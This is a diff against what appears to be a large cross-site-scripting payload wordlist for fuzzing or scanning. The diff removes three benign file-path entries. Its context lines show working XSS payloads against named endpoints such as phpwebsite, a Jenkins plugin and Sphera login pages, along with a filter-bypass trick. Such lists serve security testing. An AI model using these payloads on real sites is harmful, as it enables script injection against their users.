@@ -20720,7 +20720,6 @@ as a side note, this was also effective against a real world xss filter i came a
 ascript:alert('wxss');"">"
 asfunction:geturl,javascript:alert(1)//
 asp trick: ?input1=<script/&in%u2119ut1=>al%u0117rt('1')</script> by @irsdl
-assets/editor/image effects/cameramotionblureditor.js
 assets/scripts/amcolumn.swf?chart_settings=<settings></settings>&chart_data=<chart><message><![cdata[<a+href=\"javascript:alert(1)\">click</a>]]></message></chart>&.swf
 astnode.operator='(window.x?void0:(window.x=true,alert(1)))+';
 athcgi.exe?command=showpage&script='],[0,0]];alert('vulnerable');a=[['
@@ -22002,7 +22001,6 @@ phpwebsite/index.php?module=pagemaster&page_user_op=view_page&page_id=10\"><scri
 phpwebsite/index.php?module=search&sea_search_op=continue&pda_limit=10\"><script>alert('vulnerable')</script>
 pin/catego<script
 pinionfocusingmicroscope
-platform/platform-resources-en/src/tips/quickdoconmousemove.html
 pls/dadname/htp.print?cbuf=<script>alert('vulnerable')</script>
 pls/help/<script>alert('vulnerable')</script>
 plugin/build-metrics/getbuildstats?label=%22%3e%3csvg%2fonload%3dalert(1337)%3e&range=2&rangeunits=weeks&jobfilteringtype=all&jobfilter=&nodefilteringtype=all&nodefilter=&launcherfilteringtype=all&launcherfilter=&causefilteringtype=all&causefilter=&jenkins-crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7b%22label%22%3a+%22search+results%22%2c+%22range%22%3a+%222%22%2c+%22rangeunits%22%3a+%22weeks%22%2c+%22jobfilteringtype%22%3a+%22all%22%2c+%22jobnameregex%22%3a+%22%22%2c+%22jobfilter%22%3a+%22%22%2c+%22nodefilteringtype%22%3a+%22all%22%2c+%22nodenameregex%22%3a+%22%22%2c+%22nodefilter%22%3a+%22%22%2c+%22launcherfilteringtype%22%3a+%22all%22%2c+%22launchernameregex%22%3a+%22%22%2c+%22launcherfilter%22%3a+%22%22%2c+%22causefilteringtype%22%3a+%22all%22%2c+%22causenameregex%22%3a+%22%22%2c+%22causefilter%22%3a+%22%22%2c+%22jenkins-crumb%22%3a+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7d&submit=search
@@ -22123,7 +22121,6 @@ soinfo.php?\"><script>alert('vulnerable')</script>
 solar_history.php?time_begin=xx%22%3e%3cscript%3ealert(document.domain)%3c/script%3e%3c%22&time_end=&event_level=0&event_pcs=1&search_on=on&search_off=on&word=hj%27&sort_type=0&record=10&command=%95%5c%8e%a6
 solar_slidesub.php?id=4&play=1&pow=sds%22%3e%3cscript%3ealert(document.domain)%3c/script%3e%3c%22&bgcolor=green
 solutionfocused
-spec/fixtures/pages/onmouseup.html
 sphera/login/sm_login_screen.php?error=\"><script>alert('vulnerable')</script>
 sphera/login/sm_login_screen.php?uid=\"><script>alert('vulnerable')</script>
 src/login.php?referer=%22%3e%3cscript%3econfirm(document.domain)%3c/script%3e
